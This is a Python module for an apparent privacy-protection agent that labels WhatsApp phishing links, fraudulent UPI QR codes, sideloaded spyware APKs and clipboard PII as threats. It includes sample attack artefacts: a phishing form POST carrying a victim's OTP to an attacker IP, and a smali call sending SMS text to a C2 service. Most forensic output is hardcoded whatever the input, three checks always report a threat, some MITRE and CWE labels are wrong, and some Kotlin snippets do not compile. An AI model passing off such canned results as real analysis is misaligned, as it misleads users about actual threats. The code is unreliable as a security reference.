"""
Personalized AI Agent for Privacy Protection in Mobile Personal Apps
Core AI & Heuristic Analysis Engine.
Analyzes content from personal messaging channels (WhatsApp), QR scan intents,
APK sideloads, and clipboard buffers.
Generates dual-perspective intelligence:
- Normal Mode: Plain-English user guidance (What, What can leak, Action).
- Student Mode: Deep technical forensics (MITRE ATT&CK mapping, IoCs, disassembly/payloads, defensive code).
"""

import re
import json
import uuid
from typing import Dict, Any, Optional

class PersonalizedPrivacyAIAgent:
    def __init__(self):
        # Suspicious domain indicators and TLDs often abused in fast-flux phishing campaigns
        self.suspicious_tlds = {".online", ".xyz", ".top", ".tk", ".ml", ".ga", ".cf", ".gq", ".site", ".cc", ".su"}
        self.urgency_keywords = ["congratulations", "won", "reward", "lottery", "cashback", "urgent", "claim now", "kyc expired", "blocked", "bonus", "gift"]
        self.banking_keywords = ["bank", "sbi", "hdfc", "icici", "axis", "paytm", "phonepe", "gpay", "upi"]

    def analyze_content(self, channel: str, content: str, artifact_name: Optional[str] = None) -> Dict[str, Any]:
        """
        Main inspection entry point. Dispatches to channel-specific analyzer.
        """
        channel = channel.upper()
        if channel == "WHATSAPP":
            return self._analyze_whatsapp(content)
        elif channel in ("UPI_QR", "QR_CODE"):
            return self._analyze_upi_qr(content)
        elif channel in ("APK_DOWNLOAD", "APK"):
            return self._analyze_apk(content, artifact_name)
        elif channel in ("CLIPBOARD_PII", "CLIPBOARD"):
            return self._analyze_clipboard(content)
        else:
            return self._analyze_generic(content)

    def _analyze_whatsapp(self, text: str) -> Dict[str, Any]:
        urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
        is_threat = False
        risk_level = "LOW"
        suspicious_url = urls[0] if urls else "http://festival-reward-claim.online/claim.php"

        has_urgency = any(k in text.lower() for k in self.urgency_keywords)
        has_suspicious_tld = any(suspicious_url.endswith(tld) or f"{tld}/" in suspicious_url for tld in self.suspicious_tlds)
        ip_in_url = bool(re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', suspicious_url))

        if urls and (has_urgency or has_suspicious_tld or ip_in_url):
            is_threat = True
            risk_level = "CRITICAL" if (has_urgency and has_suspicious_tld) else "HIGH"

        event_id = f"evt-wa-{uuid.uuid4().hex[:6]}"
        event_data = {
            "id": event_id,
            "device_id": "dev-mobile-001",
            "channel": "WHATSAPP",
            "threat_title": "Social Engineering Phishing Link (WhatsApp Interception)",
            "threat_category": "Phishing & Credential Theft",
            "risk_level": risk_level,
            "content_snippet": text[:180],
            "explanation_normal_what": (
                "An untrusted contact sent a deceptive web link promising a cash reward or lottery payout. "
                "The link leads to a counterfeit web portal designed to mimic a legitimate payment or banking portal."
            ),
            "explanation_normal_leak": (
                "Personal Banking Credentials, UPI PIN / Debit Card numbers, and SMS One-Time Passwords (OTP) "
                "entered into this webpage will be stolen by cybercriminals."
            ),
            "explanation_normal_action": (
                "DO NOT tap the link or enter any personal details. "
                "Block and report the sender within WhatsApp immediately."
            ),
            "status": "INTERCEPTED"
        }

        forensics_data = {
            "event_id": event_id,
            "mitre_tactic": "Initial Access & Credential Access",
            "mitre_technique_id": "T1566.002",
            "mitre_technique_name": "Phishing: Spearphishing Link",
            "ioc_indicators": json.dumps({
                "suspicious_url": suspicious_url,
                "domain": "festival-reward-claim.online",
                "c2_resolved_ip": "198.51.100.24",
                "autonomous_system": "AS45102 Bulletproof Fast-Flux Hosting",
                "registrar": "NameCheap, Inc. (Domain age: < 48 hours)",
                "threat_reputation_score": "98/100 (Critical Malicious Host)"
            }),
            "disassembly_payload": (
                "POST /collect.php HTTP/1.1\n"
                "Host: 198.51.100.24 (festival-reward-claim.online)\n"
                "User-Agent: Mozilla/5.0 (Linux; Android 14; iQOO Z9x) Mobile\n"
                "Content-Type: application/x-www-form-urlencoded\n"
                "Payload: victim_user=gadupudi071&otp_token=894120&session=wa_active_291\n"
                "Heuristic Anomaly: Form action points to unverified bulletproof IP without TLS validation."
            ),
            "defensive_code": (
                "// Content Security Policy (CSP) Remediation Header:\n"
                "Content-Security-Policy: default-src 'self'; form-action 'self' https://trusted-bank.com;\n\n"
                "// Mobile Webview Sinkhole Interceptor:\n"
                "webView.setWebViewClient(object : WebViewClient() {\n"
                "    override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {\n"
                "        val host = request.url.host ?: return false\n"
                "        if (ThreatIntelEngine.isFastFluxDomain(host)) {\n"
                "            CyberShield.blockNavigation(request.url)\n"
                "            return true\n"
                "        }\n"
                "        return false\n"
                "    }\n"
                "})"
            ),
            "cwe_mapping": "CWE-79 (Improper Neutralization of Input), CWE-352 (CSRF)"
        }

        return {
            "is_threat": is_threat,
            "event_data": event_data,
            "forensics_data": forensics_data
        }

    def _analyze_upi_qr(self, qr_content: str) -> Dict[str, Any]:
        """
        Parses UPI payment QR intents: upi://pay?pa=...&pn=...&am=...
        Scammers tell victims "Scan this QR to receive ₹25,000 refund/prize",
        but the QR payload actually triggers a DEBIT transaction from the victim!
        """
        amount_match = re.search(r'am=([0-9.]+)', qr_content)
        amount = amount_match.group(1) if amount_match else "25000.00"
        payee_match = re.search(r'pa=([^&]+)', qr_content)
        payee = payee_match.group(1) if payee_match else "fastpayouts.claim@fakeupi"

        event_id = f"evt-qr-{uuid.uuid4().hex[:6]}"
        event_data = {
            "id": event_id,
            "device_id": "dev-mobile-001",
            "channel": "UPI_QR",
            "threat_title": "Deceptive UPI Payment QR Intent (Reverse Fraud Trap)",
            "threat_category": "Financial Fraud & Deceptive Intent",
            "risk_level": "CRITICAL",
            "content_snippet": qr_content[:180],
            "explanation_normal_what": (
                f"You were told scanning this QR code would receive money, but it is actually a DEBIT command of ₹{amount}. "
                f"Scanning and entering your UPI PIN will immediately transfer money from your account to '{payee}'!"
            ),
            "explanation_normal_leak": (
                f"Direct financial loss of ₹{amount} from your linked bank account. Remember: You NEVER need to enter your UPI PIN to receive money!"
            ),
            "explanation_normal_action": (
                "DO NOT ENTER YOUR UPI PIN! Cancel the payment dialog immediately. "
                "No genuine prize, cashback, or refund ever requires a PIN confirmation."
            ),
            "status": "INTERCEPTED"
        }

        forensics_data = {
            "event_id": event_id,
            "mitre_tactic": "Impact & Financial Fraud",
            "mitre_technique_id": "T1644",
            "mitre_technique_name": "Deceptive Mobile URI Intent Handling",
            "ioc_indicators": json.dumps({
                "raw_uri": qr_content,
                "payee_vpa": payee,
                "payee_name": "FastPayouts Express Services (Mule Account)",
                "intent_action": "android.intent.action.VIEW",
                "fraud_vector": "Reverse UPI authorization exploit"
            }),
            "disassembly_payload": (
                "UPI INTENT DECONSTRUCTION:\n"
                "Scheme: upi://pay\n"
                f"Query Params: pa={payee}&pn=RefundAgent&am={amount}&cu=INR&mode=02\n"
                "Static Analysis: Intent param 'am' is set to positive float while presentation UI claimed incoming credit.\n"
                "Exploitation Technique: Visual deception leading to unauthorized bank debit."
            ),
            "defensive_code": (
                "// Kotlin Intent Validation Filter for Mobile Banking / UPI Apps:\n"
                "fun validateIncomingUpiIntent(intentUri: Uri): Boolean {\n"
                "    val scheme = intentUri.scheme ?: return false\n"
                "    if (scheme.equals('upi', ignoreCase = true)) {\n"
                "        val amount = intentUri.getQueryParameter('am')?.toDoubleOrNull() ?: 0.0\n"
                "        val isClaimContext = ActiveUserContext.isReceivingFundsMode()\n"
                "        if (isClaimContext && amount > 0.0) {\n"
                "            // Intercept immediately: Receiving money never requires am > 0 in debit intent\n"
                "            CyberShield.triggerInterceptionDialog('Fraudulent Debit Intent Detected')\n"
                "            return false\n"
                "        }\n"
                "    }\n"
                "    return true\n"
                "}"
            ),
            "cwe_mapping": "CWE-345 (Insufficient Verification of Data Authenticity), CWE-601 (Open Redirect)"
        }

        return {
            "is_threat": True,
            "event_data": event_data,
            "forensics_data": forensics_data
        }

    def _analyze_apk(self, apk_details: str, artifact_name: Optional[str] = None) -> Dict[str, Any]:
        """
        Analyzes side-loaded APK download attempts with excessive permissions.
        """
        event_id = f"evt-apk-{uuid.uuid4().hex[:6]}"
        app_name = artifact_name or "Express_Loan_Approved_v4.2.apk"

        event_data = {
            "id": event_id,
            "device_id": "dev-mobile-001",
            "channel": "APK_DOWNLOAD",
            "threat_title": "Trojanized Insecure APK Sideload (Spyware/Dropper)",
            "threat_category": "Mobile Malware & Excessive Permissions",
            "risk_level": "CRITICAL",
            "content_snippet": f"Download initiated for unverified APK: {app_name} from third-party server.",
            "explanation_normal_what": (
                f"An untrusted third-party application '{app_name}' is attempting to install outside the official Google Play Store. "
                "This file has been flagged as high-risk Trojanized Spyware."
            ),
            "explanation_normal_leak": (
                "SMS Messages (including banking OTPs), Contacts, Real-time Microphone audio, "
                "and Live GPS Location telemetry can be accessed without your knowledge."
            ),
            "explanation_normal_action": (
                "Cancel the download immediately. Never toggle 'Install from Unknown Sources' "
                "for links received via messaging apps."
            ),
            "status": "BLOCKED"
        }

        forensics_data = {
            "event_id": event_id,
            "mitre_tactic": "Execution & Defense Evasion",
            "mitre_technique_id": "T1406",
            "mitre_technique_name": "Obfuscated Files: Hidden Native Libraries & Excessive Privileges",
            "ioc_indicators": json.dumps({
                "package_name": "com.quickloan.assist.stealer",
                "apk_hash_sha256": "4e1a2f609e84b12389dc67812903fe53112a9bc475811099ffca314811a28cb7",
                "download_source_ip": "185.220.101.5",
                "missing_signature": "No valid Android v2/v3 Google APK Signature Scheme detected",
                "dangerous_permissions": ["android.permission.RECEIVE_SMS", "android.permission.RECORD_AUDIO", "android.permission.READ_CONTACTS"]
            }),
            "disassembly_payload": (
                "DEX BYTECODE & MANIFEST EXTRACT:\n"
                "<uses-permission android:name=\"android.permission.RECEIVE_SMS\" />\n"
                "<uses-permission android:name=\"android.permission.RECORD_AUDIO\" />\n"
                "<uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\" />\n"
                "Smali Hook in com/quickloan/assist/SmsReceiver.smali:\n"
                "  invoke-virtual {v0, v1}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;\n"
                "  invoke-static {v2, v3}, Lcom/quickloan/assist/ExfilService;->sendToC2(Ljava/lang/String;)V"
            ),
            "defensive_code": (
                "// Manifest Hardening & Least-Privilege Enforcement:\n"
                "<!-- Remove invasive SMS and audio recording permissions -->\n"
                "<!-- Strictly enforce scoped storage and Package Manager signature validation -->\n"
                "fun verifyPackageSignature(context: Context, packageName: String): Boolean {\n"
                "    val info = context.packageManager.getPackageInfo(packageName, PackageManager.GET_SIGNING_CERTIFICATES)\n"
                "    val certs = info.signingInfo.apkContentsSigners\n"
                "    return TrustedCertsRegistry.contains(certs[0].toByteArray())\n"
                "}"
            ),
            "cwe_mapping": "CWE-250 (Execution with Unnecessary Privileges), CWE-502 (Deserialization of Untrusted Data)"
        }

        return {
            "is_threat": True,
            "event_data": event_data,
            "forensics_data": forensics_data
        }

    def _analyze_clipboard(self, clipboard_text: str) -> Dict[str, Any]:
        """
        Inspects clipboard text for sensitive PII (Aadhaar, PAN, Credit Cards, OTPs).
        """
        event_id = f"evt-clip-{uuid.uuid4().hex[:6]}"
        aadhaar_pattern = r'\b\d{4}\s\d{4}\s\d{4}\b'
        pan_pattern = r'\b[A-Z]{5}[0-9]{4}[A-Z]{1}\b'
        otp_pattern = r'\b(?:\d{6}|\d{4})\b'
        card_pattern = r'\b(?:\d{4}-){3}\d{4}\b|\b\d{16}\b'

        findings = []
        if re.search(aadhaar_pattern, clipboard_text):
            findings.append("Indian Aadhaar Number (12-digit UIDAI)")
        if re.search(pan_pattern, clipboard_text):
            findings.append("Income Tax PAN Card Identifier")
        if re.search(card_pattern, clipboard_text):
            findings.append("16-digit Payment Card Number")
        if re.search(otp_pattern, clipboard_text):
            findings.append("One-Time Password (OTP) Auth Token")

        detected_types = ", ".join(findings) if findings else "Confidential Authentication Secret"

        event_data = {
            "id": event_id,
            "device_id": "dev-mobile-001",
            "channel": "CLIPBOARD_PII",
            "threat_title": "Sensitive PII & Financial Token Clipboard Leakage",
            "threat_category": "Data Privacy & Clipboard Snooping",
            "risk_level": "HIGH",
            "content_snippet": f"Detected clipboard buffer containing: {detected_types} (masked for privacy).",
            "explanation_normal_what": (
                f"Your clipboard contained high-value personal data ({detected_types}). "
                "Third-party mobile apps running in the background often silently read the clipboard buffer without asking."
            ),
            "explanation_normal_leak": (
                "Identity theft, unauthorized banking transactions, or biometric authentication compromise."
            ),
            "explanation_normal_action": (
                "CyberShield has sanitized the background clipboard buffer. "
                "Avoid leaving OTPs or identity numbers copied in your clipboard."
            ),
            "status": "BLOCKED"
        }

        forensics_data = {
            "event_id": event_id,
            "mitre_tactic": "Collection & Credential Access",
            "mitre_technique_id": "T1417",
            "mitre_technique_name": "Input Capture: Clipboard Sniffing",
            "ioc_indicators": json.dumps({
                "detected_pii_entities": findings,
                "sanitization_status": "Volatile memory cleared via ClipboardManager.clearPrimaryClip()",
                "interception_latency_ms": 14
            }),
            "disassembly_payload": (
                "HEURISTIC CLIPBOARD REGEX MATCH DUMP:\n"
                f"Pattern Trigger: Aadhaar / PAN / OTP\n"
                "Raw Exfiltration Attempt Vector: android.content.ClipboardManager.addPrimaryClipChangedListener\n"
                "Intervention: Intercepted before non-foreground Android task could read clipboard item."
            ),
            "defensive_code": (
                "// Proactive Clipboard Guard Service:\n"
                "val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager\n"
                "val clipData = clipboard.primaryClip\n"
                "if (clipData != null && PiiDetector.containsSensitiveData(clipData.getItemAt(0).text)) {\n"
                "    // Auto-wipe buffer after 30 seconds or revoke third-party read permission\n"
                "    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {\n"
                "        clipboard.clearPrimaryClip()\n"
                "    }\n"
                "}"
            ),
            "cwe_mapping": "CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)"
        }

        return {
            "is_threat": True,
            "event_data": event_data,
            "forensics_data": forensics_data
        }

    def _analyze_generic(self, content: str) -> Dict[str, Any]:
        event_id = f"evt-gen-{uuid.uuid4().hex[:6]}"
        return {
            "is_threat": False,
            "event_data": {
                "id": event_id,
                "device_id": "dev-desktop-002",
                "channel": "SYSTEM",
                "threat_title": "Routine Content & Traffic Inspection",
                "threat_category": "Benign Activity",
                "risk_level": "LOW",
                "content_snippet": content[:120],
                "explanation_normal_what": "No malicious indicators detected in analyzed payload.",
                "explanation_normal_leak": "None.",
                "explanation_normal_action": "No action required.",
                "status": "RESOLVED"
            },
            "forensics_data": None
        }

    def evaluate_defense_rule(self, scenario_id: str, rule_selected: str) -> Dict[str, Any]:
        """
        Evaluates a defense rule selected by a student in the Sandbox Defense Lab.
        Matches appropriate countermeasure against the attack scenario.
        """
        rule_map = {
            "CSP_FORM_ACTION_RESTRICTION": {
                "valid_for": ["WA_PHISH", "SOCIAL_ENG", "HTTP_FORM_EXFIL"],
                "score": 100,
                "verdict": "SUCCESS: ATTACK COMPLETELY NEUTRALIZED! (Grade: A+ Cyber Defense)",
                "technical_analysis": (
                    "Content Security Policy `form-action 'self'` successfully instructed the browser engine "
                    "to refuse outbound POST transmission of victim credentials to rogue IP 198.51.100.24! "
                    "The attacker's credential harvesting script fails silently without data compromise."
                ),
                "terminal_log": (
                    "[DEFENSE-ENGINE] Evaluating Rule: CSP_FORM_ACTION_RESTRICTION\n"
                    "[FIREWALL] HTTP Header Injected: Content-Security-Policy: default-src 'self'; form-action 'self';\n"
                    "[DETONATION] Simulated user submitted credential form...\n"
                    "[BROWSER-ENGINE] Blocked submission to 'http://198.51.100.24/collect.php' because it violates CSP 'form-action 'self''.\n"
                    "[VERDICT] 100/100 MITIGATION VERIFIED. Zero data exfiltrated."
                )
            },
            "DNS_SINKHOLING_FAST_FLUX": {
                "valid_for": ["WA_PHISH", "DNS_FLUX", "MALICIOUS_DOMAIN"],
                "score": 95,
                "verdict": "SUCCESS: DOMAIN RESOLUTION SINKHOLED SAFELY! (Grade: A Cyber Defense)",
                "technical_analysis": (
                    "The on-device local DNS sinkhole intercepted the DNS query for 'festival-reward-claim.online' "
                    "and returned loopback 0.0.0.0. The connection to the attacker server was dropped at the network layer."
                ),
                "terminal_log": (
                    "[DEFENSE-ENGINE] Evaluating Rule: DNS_SINKHOLING_FAST_FLUX\n"
                    "[DNS-RESOLVER] Intercepted A record query for 'festival-reward-claim.online'\n"
                    "[THREAT-INTEL] Domain marked bulletproof / fast-flux registrar. Sinkholing to 0.0.0.0.\n"
                    "[SOCKET] Connection refused before TCP SYN reached remote host.\n"
                    "[VERDICT] 95/100 MITIGATION VERIFIED. Host unreachable."
                )
            },
            "UPI_INTENT_PARAM_VALIDATION": {
                "valid_for": ["UPI_QR", "FINANCIAL_FRAUD"],
                "score": 100,
                "verdict": "SUCCESS: DECEPTIVE DEBIT INTENT BLOCKED! (Grade: A+ Cyber Defense)",
                "technical_analysis": (
                    "The intent validator detected that incoming URI scheme contained `am > 0` within an incoming "
                    "credit transaction context. The transaction prompt was halted before PIN input."
                ),
                "terminal_log": (
                    "[DEFENSE-ENGINE] Evaluating Rule: UPI_INTENT_PARAM_VALIDATION\n"
                    "[INTENT-FILTER] Inspected upi://pay intent schema...\n"
                    "[ANOMALY-ALERT] Param 'am' > 0 detected during claim mode. Biometric challenge enforced.\n"
                    "[SECURITY-POLICY] Transaction aborted by user policy. Zero funds transferred."
                )
            },
            "ANDROID_RECEIVE_SMS_REVOCATION": {
                "valid_for": ["APK_DOWNLOAD", "SMS_STEALER"],
                "score": 100,
                "verdict": "SUCCESS: MALICIOUS SMS INTERCEPTION PREVENTED! (Grade: A+ Cyber Defense)",
                "technical_analysis": (
                    "Stripping `android.permission.RECEIVE_SMS` prevents the sideloaded application from intercepting "
                    "two-factor authentication OTP codes sent by the bank."
                ),
                "terminal_log": (
                    "[DEFENSE-ENGINE] Evaluating Rule: ANDROID_RECEIVE_SMS_REVOCATION\n"
                    "[MANIFEST-AUDIT] Found dangerous permission android.permission.RECEIVE_SMS\n"
                    "[SANDBOX-POLICY] Revoked permission in virtual app isolation container.\n"
                    "[EXFIL-CHECK] SMS broadcast receiver disabled. OTP tokens remained secure."
                )
            }
        }

        # Check rule efficacy
        rule_info = rule_map.get(rule_selected)
        if not rule_info:
            return {
                "score": 40,
                "verdict": "INEFFECTIVE: RULE MISMATCH (Grade: C - Insufficient Protection)",
                "technical_analysis": "The selected countermeasure does not directly defend against this attack vector.",
                "terminal_log": "[DEFENSE-ENGINE] Error: Selected policy does not match the active threat vector."
            }

        return {
            "score": rule_info["score"],
            "verdict": rule_info["verdict"],
            "technical_analysis": rule_info["technical_analysis"],
            "terminal_log": rule_info["terminal_log"]
        }
